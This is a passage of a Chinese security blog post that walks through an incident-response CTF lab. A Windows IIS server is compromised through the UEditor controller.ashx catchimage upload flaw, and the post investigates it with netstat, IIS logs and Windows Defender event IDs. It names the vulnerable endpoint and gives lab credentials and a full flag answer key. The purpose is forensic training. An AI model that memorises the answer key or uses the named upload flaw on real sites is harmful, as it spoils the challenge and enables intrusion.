#  学习干货 | 新手必练！真实复现DMZ区攻防场景与排查思路（附开源环境）  
原创 爱州
                        爱州  州弟学安全   2026-01-19 01:40  
  
**本篇文章共 10000字，完全阅读全篇约10分钟 州弟学安全，只学有用的知识**  
  
## 一、写在前面  
  
**大家好，我是州弟。**  
  
**【回望2025：感谢相遇】**  
 回顾刚刚过去的 2025 年，非常荣幸能与圈内这么多志同道合的师傅相识。这一年对我来说是成长的一年，我的公众号粉丝从 8000 涨到了 14000 左右，B 站也从零起步做到了 3000 粉。大家的热爱与支持，让我更加笃定这条路没有走错。 在 2025 年 4 月份左右，我开始尝试做私域（主要是在公开群内交流技术、探讨行业发展等），这期间最让我感到欣慰和荣幸的，是成功介绍了一位粉丝师傅来到我们公司（思而听）进行实习学习，见证了大家从线上交流到线下并肩作战的缘分。 总结这一年，千言万语汇成一句“荣幸”。当时我也发了一条朋友圈总结，文字太长就不赘述了，放一张截图记录这份回忆：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaYZJTJYMNhy9nI8kUhw96K9ic8Hyncia8Z73kmGUngwQTsowYg6kA9RUg/640?wx_fmt=jpeg&from=appmsg "")  
  
**【关于职业与“卖课”：投资未来】**  
 一直有很多师傅问我是否打算开课，**坦率地说，我目前没有这个计划。**  
 相比于赚取当下的“快钱”，我更偏向于**投资未来的自己**  
。今年跳槽后，我的工作重心基本围绕着**渗透测试、公众号运营、应急响应以及勒索病毒处置**  
展开。在实战中我学到了非常多，也感谢很多师傅信任我，给我介绍了不少应急响应和勒索病毒处理的业务。 我始终坚信，**优质的人脉资源就是最好的投资**  
。如果大家有网络安全方面的需求，或者想互相学习讨论、交流应急响应/渗透测试经验，欢迎随时加个好友，以防不时之需。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaN1xX3VQ2LELC9flumZJT4lwKrSpt3ANLGSQUIoQMu9Mu9EZqI1XmJA/640?wx_fmt=png&from=appmsg "")  
  
**【关于创作方向：为何转向靶场复现？】**  
 今年我也写了一篇关于**《学习干货|从迷茫到前行：我的网络安全学习之路》**  
的文章，收到了不少师傅的肯定，感兴趣的师傅可以阅读一下：[学习干货|从迷茫到前行：我的网络安全学习之路](https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&mid=2247489973&idx=1&sn=3004b71de912f0e6d09b31822ac23a4a&scene=21#wechat_redirect)  
  
  
细心的师傅可能发现了，最近我一直在做靶场环境，而较少发布直接的实战渗透或应急文章。这里我想详细解释一下原因，主要基于两方面的考量：  
1. **渗透测试/漏洞挖掘方面（合规与法律风险）**  
 随着《网络安全法》等法律法规的逐步完善，挖掘 SRC 并将详细思路发布出来，可能会对相关企业造成影响，处理不当甚至容易引发法律风险。加之目前公司业务项目繁多，我也调整了重心，不再像以前那样单纯为了挖洞写文章，而是更多地通过项目实战去提升自己，为未来的简历增添更多色彩（如针对培训、应急、渗透等领域的深度积累）。  
  
1. **应急响应方面（保密协议与客户声誉）**  
 这是最关键的一点。基本上每个应急响应项目都签署了严格的**保密协议**  
。如果将应急响应的详细过程（特别是资产特征、IP、业务截图）发出来，极容易被推断出是哪个单位。这对受害单位的**股价、口碑、商业信誉**  
都会造成二次伤害。  
  
**所以，为了既能分享技术，又不违反职业道德**  
，我们会尽力把现场溯源到的真实攻击手法和链路，**1:1 复现为脱敏后的靶场环境**  
分享给大家。这样既还原了攻击者的全过程，又完美保护了客户的资产安全。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5ia5neQX9s54iad6u5tHfzrmwle1Z7gxdG7bVho4RiaLQqzpJHMJ4Lz2DGg/640?wx_fmt=png&from=appmsg "")  
  
**而今天这篇文章，正是基于这样一个真实的实战案例改编而来。**  
 这是我在 Solar 举办的比赛中出的一道题，现在我将环境开源，并附上详细的排查思路，希望能对大家有所帮助。  
## 二、学习环境  
### 前言  
  
对于本次学习环境来源于青少年CTF 第二届Solar应急响应杯，本题由**州弟学安全**  
提供，原WP地址：[【官方WP】第二届solar杯·应急响应挑战赛官方题解](https://mp.weixin.qq.com/s?__biz=MzkyOTQ0MjE1NQ==&mid=2247507575&idx=1&sn=1c01d5f972ef8f0c89c26c4e730be49e&scene=21#wechat_redirect)  
  
  
本题可以参考我之前做过的DMZ三层渗透测试文章逆推学习：[综合渗透|超详细！手把手学习三层网络渗透及综合渗透概念](https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&mid=2247486759&idx=1&sn=b30175c1dd3419bafb022072ae3cd0ab&scene=21#wechat_redirect)  
  
### 题目描述  
>   
> 本次环境取自于实际应用中dmz隔离，仿真模拟了(生产车间/测试车间)环境，其中Windows server 2019系统为主要突破点，此机器搭建了一个对外开放的论坛，以便于让员工、客户等能够及时看到企业动态  
> 由于企业对于网络安全疏忽，未对生产车间及其它区域服务器做物理隔离，导致攻击者以Windows server 2019系统(DMZ1)为突破口攻击成功，获取终端权限后，攻击者未收手，而是进行内网漏洞扫描，拿下另一台Ubuntu(DMZ2)的机器，并做了权限维持操作，请根据题目描述依次排查进行学习  
  
>   
> 注意：这些攻击都是在无安全设备的情况下进行的，所以在实战中遇到需根据日志及可能存在的漏洞去判断、测试、复盘等条件总结  
> 注意：web日志与系统日志有时区差别，这也仿真了在实战中一些开放配置不当导致的溯源难度加大问题  
  
### 机器介绍  
```
机器1：Windows server 2019(双网卡)，账号密码：administrator/Solarsec521  机器2：Ubuntu(单网卡)，账号密码：root/Solarsec521
```  
  
排查指导：应先从入口点Windows server 2019开始排查，顺藤摸瓜接着排查DMZ2机器(Ubuntu)  
### 下载地址与在线地址  
- 主地址：https://pan.baidu.com/s/1kM2ojRM7QvsZvwbejqE4gQ 提取码: ek24  
  
- 备用下载：https://pan.quark.cn/s/51fb78ad3ac1  
  
- 解压密码：HHsolar88*90  
  
- 在线地址1：(青少年CTF)https://www.qsnctf.com/ (本题目需要离线下载，在线解题，公益免费)  
  
- 在线地址2：(玄机) https://xj.edisec.net/challenges/379、https://xj.edisec.net/challenges/380 (无需下载在线体验、收费)  
  
- 历史靶场合集：https://sierting.feishu.cn/wiki/ZjxSwm1ngi5hSWkR0O6cQ9TznGb  
  
### 题目列表  
```
题目1.  排查漏洞  描述：根据开放服务排查审计日志，提交攻击者利用漏洞传入webshell的url，提交示例：flag{/flag/abc/kk=abc}  flag{/plugins/Ueditor/net/controller.ashx action=catchimage}  题目2.  Windows defender专项  描述：提交Windows defender病毒和威胁防护中，拦截攻击者最早执行的命令，提交示例：flag{dir}  flag{whoami}  题目3.  Windows defender专项  描述：提交Windows defender病毒和威胁防护中，杀软隔离的第一个webshell文件，提交文件名，提交示例：flag{shell.php}  flag{6390217215502412559088650.aspx}  题目4.  日志专项  描述：审计web日志，攻击者在多次上传webshell后，最终远控使用的webshell文件是哪个，提交文件名，提交示例：flag{shell.php}  flag{6390217325293187938071651.aspx}  题目5.  木马专项  描述：提交攻击者最终使用的webshell中key和pass，提交示例：flag{key&pass}  flag{key&solar}  题目6.  远控专项  描述：审计系统日志，提交攻击者远控后关闭Windows defender的时间，可使用桌面工具FullEventLogView辅助审计，提交示例：flag{2025/1/1 12:01:01}  flag{2025/12/24 12:24:07}  题目7.  远控专项  描述：审计系统日志，提交攻击者创建的用户名及远程登录IP及时间，提交示例：flag{user&1.1.1.1&2025/1/1 12:01:01}  flag{$system&192.168.70.3&2025/12/24 13:32:13}  题目8.  恶意文件排查  描述：攻击者为了进行内网渗透，上传了内网扫描及其它恶意文件，提交文件的所在路径，提交示例：flag{C:\Windows\System32}  flag{C:\Users\Administrator\Downloads}  题目9.  安全加固  描述：清除攻击者用于权限维持添加的用户，清除完毕后前往C:\Users\Administrator\Desktop\flag\1.txt读取flag  flag{d47cab4549e08c5227d2afd5d4e1a051}  题目10.  安全加固  描述：清除攻击者上传的所有webshell，清除完毕后前往C:\Users\Administrator\Desktop\flag\2.txt读取flag  flag{31527b4001257a29c68c357a15376e59}  题目11.  安全加固  描述：清除攻击者上传的所有恶意文件，清除完毕后前往C:\Users\Administrator\Desktop\flag\3.txt读取flag  flag{42a996202210e8572eebae2968f393db}  题目12.  内网渗透排查  描述：开始排查Ubuntu(DMZ2)环境，通过前面排查的内网扫描结果以及攻击者上传的工具，攻击者对于内网机器Ubuntu(DMZ2)进行了漏洞利用，根据相关线索本地访问相关端口，攻击者为了权限维持，后期进行获取更多信息，提交攻击者在web端新增的账号，提交示例：flag{user}  flag{system}  题目13.  内网渗透排查  描述：攻击者在web端获取到了敏感信息后获取到了终端权限，写入了隐藏用户，提交其用户名，提交示例：flag{user}  flag{sys-update}  题目14.  安全加固  描述：清除攻击者在web端新增的用户名后，前往/var/flag/1文件中读取flag并提交  flag{ad31ea22e324ee6effd454decf7477c9}  题目15.  安全加固  描述：清除攻击者在服务器新增的用户名所有信息，前往/var/flag/2文件中读取flag并提交  flag{85fdb55f08925b3ae7149e869124f2c4}  题目16.  安全加固  描述：当前web端存在漏洞，先停止此web服务进程后，前往/var/flag/3文件中读取flag并提交  flag{163e32607debcc6091e993929afe8064}  题目17.  安全加固  描述：攻击者通过web漏洞拿到了root账号密码，请修改密码后，前往/var/flag/4文件中读取flag并提交  flag{2d1848c8560becac27d30a5d4daf6da3}
```  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iatBa54bocxjKxTvQ9IqLaIzfVO1vibdtMBvxYZ2FYpcl1HG5ibLeoqk4g/640?wx_fmt=png&from=appmsg "")  
### 解题步骤  
#### 1. 排查漏洞  
>   
> 根据开放服务排查审计日志，提交攻击者利用漏洞传入webshell的url，提交示例：flag{/flag/abc/kk=abc}  
  
  
溯源必记：  
- 查开放端口：因为外部攻击者攻击必须依靠开放端口为基础连接进来  
  
- 查外接设备：如果没有开放端口，则可能是U盘等外接设备导致的上线  
  
- 社工类：如钓鱼、下载非官方软件导致的上线等  
  
服务器就像一间房子，开放端口就像窗户和门，如果连门和窗都没有，出现问题就侧重于房间内部  
  
netstat -nao  
查看开放端口有很多，侧重于80、139、445、3389常见端口先行排查  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5ia705K2iccvkFXeOea842wDxhfygENT7EArlLSqEM0qyBiblGNbMzc7bMA/640?wx_fmt=png&from=appmsg "")  
  
根据题目提示，本次先排查80端口，一般情况下80端口是WEB服务，正常情况下可以使用本机或虚拟机内浏览器访问一下  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaIeO87iaztoeLewyZmHiagSXJhucbib5icguECToqpibkZcfxw17MYVibdlibg/640?wx_fmt=png&from=appmsg "")  
  
通过上图看到这是一个CMS系统，那么WEB又分为不同中间件服务搭建：apache  
、nginx  
、IIS  
，  
  
一般情况下在我们执行了netstat -nao  
后会看到PID，然后在用tasklist | findstr "1234" # 替换为实际 PID  
  
但是80端口的PID为4  
，这样执行后就会变成下图这样  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaWibJ09MMhAlwcDL9SWKw52eVP514lFzUHU1ib0nX17KxrhU8oDjgOYRA/640?wx_fmt=png&from=appmsg "")  
  
这个时候可以用netsh http show servicestate  
查看详细的服务信息  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaoMicmqHDqyicdHhFXhSEAic8wntiaahvPZiciaD3YW7LicNyiaSVEtDXS9Db3Q/640?wx_fmt=png&from=appmsg "")  
  
需要记住的是W3SVC是存放IIS日志目录的地方，所以这是IIS搭建的80端口，我们需要审计IIS日志  
  
通过前往C:\inetpub\logs\LogFiles\W3SVC1  
目录，如下图看到，日志都是以每天存放的，按照习惯优先排查：时间范围前7天(最低)，日志文件大小最大  
级别进行排查  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5ialEY8lUEhX5g0AXzgkOicAn5icAQQ3maxyM5hKX9VpzjAEicgdRzp4Sh6A/640?wx_fmt=png&from=appmsg "")  
  
如下图所示，审计1223  
日志，开始很明显的为目录扫描行为  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaC5UeXicVQNk0aJCrhMvduoVFfIriccMuB0vVbRdSXmJVYr4xVHy44h2A/640?wx_fmt=png&from=appmsg "")  
  
如下图直到下滑到最下方，看到有关于200状态码且有规律的url：Ueditor  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaiakfoK0qVCj9icct58zrX6TFibJZjWDqQfWv0XJWBKaNrMD1Bp8G2FSkQ/640?wx_fmt=png&from=appmsg "")  
  
那么Ueditor是什么？当我们在实战中遇到如：xxxconfig(配置)  
、xxxeditor(编辑器)  
的url时，不确定是情况下可以先进行搜索  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaKH25M91YUIEric5NfdPQZtzH3lDIrqjdsf7icnhz6rwyicsIbPibz41ibog/640?wx_fmt=png&from=appmsg "")  
  
如上图所示，诸如：编辑器、框架类，一般都会存在历史漏洞，如果不知道，则可以继续搜索  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaYnNTV17JRmgIPAibUopBK8GZfe4Y789ClMw76vl5bX1xqao2sxcGMicg/640?wx_fmt=png&from=appmsg "")  
  
如上图所示，我们知道了此编辑器存在的历史漏洞，然后继续审计日志，找到可疑点，比如：  
频繁请求一个文件(webshell持续访问)**、**  
长url可疑编码(是否SQL注入)  
，这也是研判技巧  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iasDmx8SwwfGgko5pFVYRCYvib22ibLXPz80ACwysr8nWG8vVibyBbPENRw/640?wx_fmt=png&from=appmsg "")  
  
如上图所示，1224日志  
中有大量访问aspx文件的请求，在这之前访问了/plugins/Ueditor/net/controller.ashx action=catchimag  
的url，这个URL是否可疑？直接搜索  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaSeJ9xjiabKTKNo1ibBh6plXpLCb1hcADLChjKd7rwdTQ7IJyiaSibjSjIA/640?wx_fmt=png&from=appmsg "")  
  
如上图所示，URL匹配到任意文件上传漏洞，/plugins  
可忽略，因为编辑器是放在此CMS中的，所以攻击者是通过此任意文件上传漏洞传入了aspx木马，进行了后续请求  
  
所以本题flag为：flag{/plugins/Ueditor/net/controller.ashx action=catchimage}  
#### 2. Windows defender专项  
>   
> 提交Windows defender病毒和威胁防护中，拦截攻击者最早执行的命令，提交示例：flag{dir}  
  
  
自Windows server 2016  
起，Windows defender默认安装，查杀能力还是非常强的  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iadosBfHVtVIQicXGMDy3WLduqdUiaCaDJYwIpQHbgmiayziaFEJPEqw6PDg/640?wx_fmt=png&from=appmsg "")  
  
上图所示，Windows defender的UI中完整历史记录有时候可能会因为某些操作丢失，所以审计系统日志就至关重要了，当没有安全设备的时候，审计日志是至关重要也是底层，我们平常排查勒索病毒时，大部分都是去审日志，遇到有安全设备的少之又少  
  
在C:\Users\Administrator\Desktop\工具\FullEventLogView  
中有FullEventLogView  
工具，用它来辅助审计日志是非常好用的，关于Windows defender事件id，我这里统计了一下如下  
  
<table><thead><tr><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">事件 ID</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">含义</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">1116</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">检测到恶意软件</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">扫描或实时防护发现了病毒/恶意软件/PUA（潜在不需要的应用程序）。</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">1117</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">执行了保护操作</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">系统成功采取了措施（如隔离、删除、清理）。</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">1118</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">保护操作失败</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">系统尝试处理威胁但失败（通常需要人工干预）。</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">1006</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">恶意软件检测</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">与 1116 类似，通常指防病毒引擎的检测事件。</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">1007</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">采取了行动</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">与 1117 类似，指防病毒平台已执行清理/隔离动作。</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">1015</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">检测到可疑行为</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">启发式分析检测到可疑活动（通常在尚未确认具体病毒签名时）。</span></section></td></tr></tbody></table>  
  
攻击者连接webshell后立即执行了命令，一般情况下和检测有关，我们这里使用事件ID：1116进行筛选  
  
